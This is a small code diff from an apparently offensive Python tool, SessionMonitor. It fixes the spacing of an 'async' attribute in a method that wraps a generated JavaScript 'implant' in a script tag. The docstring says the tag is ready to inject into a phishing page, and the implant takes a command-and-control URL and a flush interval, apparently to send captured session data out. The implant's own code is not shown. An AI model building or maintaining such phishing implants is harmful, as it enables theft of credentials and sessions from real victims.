@@ -259,7 +259,7 @@ class SessionMonitor:
                             async_load: bool = True) -> str:
         """Return a <script> tag ready to inject into a phishing page."""
         js = self.generate_implant(c2_url, flush_ms)
-        tag = f'<script{"async" if async_load else ""}>{js}</script>'
+        tag = f'<script{" async" if async_load else ""}>{js}</script>'
         return tag
 
     def save_implant(self, output_path: str, c2_url: str, flush_ms: int = 3000) -> str:
